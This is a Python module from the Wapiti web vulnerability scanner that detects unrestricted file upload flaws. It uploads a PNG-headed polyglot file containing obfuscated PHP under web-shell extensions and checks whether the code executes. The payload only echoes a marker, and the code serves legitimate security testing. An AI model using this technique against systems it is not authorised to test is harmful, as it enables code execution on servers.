#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (https://wapiti-scanner.github.io)
# Copyright (C) 2023 Nicolas Surribas
# Copyright (C) 2024 Cyberwatch
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
from typing import Optional, Iterator, Tuple, List
from random import randint, shuffle

from httpx import RequestError

from wapitiCore.definitions.unrestricted_upload import UnrestrictedUploadFinding
from wapitiCore.attack.attack import Attack, Parameter, ParameterSituation, random_string
from wapitiCore.language.vulnerability import Messages
from wapitiCore.main.log import log_red
from wapitiCore.model import PayloadInfo
from wapitiCore.net.response import Response
from wapitiCore.net import Request
from wapitiCore.net.scope import wildcard_translate
from wapitiCore.parsers.html_parser import Html

WEB_SHELL_EXTENSIONS = ["php", "phtml", "php7", "phps", "phar"]


def split_in_groups(s: str) -> List[str]:
    """Split letters of a string in groups of random size"""
    blocks = []
    while s:
        length = randint(2, 5)
        blocks.append(s[:length+1])
        s = s[length+1:]
    return blocks


def get_payload(echoed_string) -> bytes:
    """Returns a PNG file containing an obfuscated PHP payload that prints the string given as parameter"""
    blocks = split_in_groups(echoed_string)
    d = dict(enumerate(blocks))
    keys = list(d.keys())
    shuffle(keys)
    ordered_list = [str(keys.index(i)) for i in range(len(keys))]

    php_code = "$a = array(" + ",".join([f'{i} => "{d[key]}"' for i, key in enumerate(keys)]) + ");"
    php_code += "$b = array(" + ",".join(ordered_list) + "); foreach ($b as $v) echo $a[$v];"

    return b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00<?php ' + php_code.encode() + b' ?>\n'


class UploadMutator:
    def __init__(self, parameters=None, skip=None):
        self._attack_hashes = set()
        self._parameters = parameters if isinstance(parameters, list) else []
        self._skip_list = skip if isinstance(skip, set) else set()

    def mutate(self, request: Request) -> Iterator[Tuple[Request, Parameter, PayloadInfo]]:
        get_params = request.get_params
        post_params = request.post_params
        referer = request.referer

        string = random_string(length=24)
        payload = get_payload(string)

        for i in range(len(request.file_params)):
            new_params = request.file_params
            param_name = new_params[i][0]

            if self._skip_list and param_name in self._skip_list:
                continue

            if self._parameters and param_name not in self._parameters:
                continue

            for file_extension in WEB_SHELL_EXTENSIONS:
                new_params[i][1] = (f"{random_string()}.{file_extension}", payload, "image/png")

                evil_req = Request(
                    request.path,
                    method=request.method,
                    get_params=get_params,
                    post_params=post_params,
                    file_params=new_params,
                    referer=referer,
                    link_depth=request.link_depth
                )
                yield (
                    evil_req,
                    Parameter(name=param_name, situation=ParameterSituation.MULTIPART),
                    PayloadInfo(payload=string)
                )


class ModuleUpload(Attack):
    """Detect unrestricted file upload vulnerabilities."""
    name = "upload"

    def is_excluded(self, url: str):
        for exclusion in self.options["excluded_urls"]:
            if isinstance(exclusion, Request) and url == exclusion.url:
                return True
            if isinstance(exclusion, str) and wildcard_translate(exclusion).match(url):
                return True
        return False

    async def must_attack(self, request: Request, response: Optional[Response] = None):
        if response.is_directory_redirection:
            return False

        return request.is_multipart

    async def attack(self, request: Request, response: Optional[Response] = None):
        # For each upload field we try to send a PHP file using several extensions (php, phtml, etc.)
        # We look at the given response to check if the proof that the payload was executed is present
        # If this is not the case, we fetch every URL mentioned in the response to search that proof of execution
        mutator = UploadMutator()
        for mutated_request, parameter, payload_info in mutator.mutate(request):
            try:
                upload_response = await self.crawler.async_send(mutated_request, follow_redirects=True)
            except RequestError:
                self.network_errors += 1
            else:
                if payload_info.payload in upload_response.content:
                    await self.add_critical(
                        request_id=request.path_id,
                        finding_class=UnrestrictedUploadFinding,
                        request=mutated_request,
                        info=f"Unrestricted file upload vulnerability in the parameter {parameter.display_name}",
                        parameter=parameter.display_name,
                    )

                    log_red("---")
                    log_red(
                        Messages.MSG_PARAM_INJECT,
                        UnrestrictedUploadFinding.name(),
                        mutated_request.path,
                        parameter.display_name
                    )
                    log_red(Messages.MSG_EVIL_REQUEST)
                    log_red(mutated_request.http_repr())
                    log_red("---")
                    return

                html = Html(upload_response.content, mutated_request.url)

                for link in html.links:
                    if html.is_internal_to_domain(link) and not self.is_excluded(link):
                        try:
                            link_response = await self.crawler.async_send(Request(link), follow_redirects=True)
                        except RequestError:
                            self.network_errors += 1
                        else:
                            if payload_info.payload in link_response.content:
                                await self.add_critical(
                                    request_id=request.path_id,
                                    finding_class=UnrestrictedUploadFinding,
                                    request=mutated_request,
                                    info=(
                                        "Unrestricted file upload vulnerability in the parameter "
                                        f"{parameter.display_name}"
                                    ),
                                    parameter=parameter.display_name,
                                )

                                log_red("---")
                                log_red(
                                    Messages.MSG_PARAM_INJECT,
                                    UnrestrictedUploadFinding.name(),
                                    mutated_request.path,
                                    parameter.display_name
                                )
                                log_red(Messages.MSG_EVIL_REQUEST)
                                log_red(mutated_request.http_repr())
                                log_red("---")
                                return
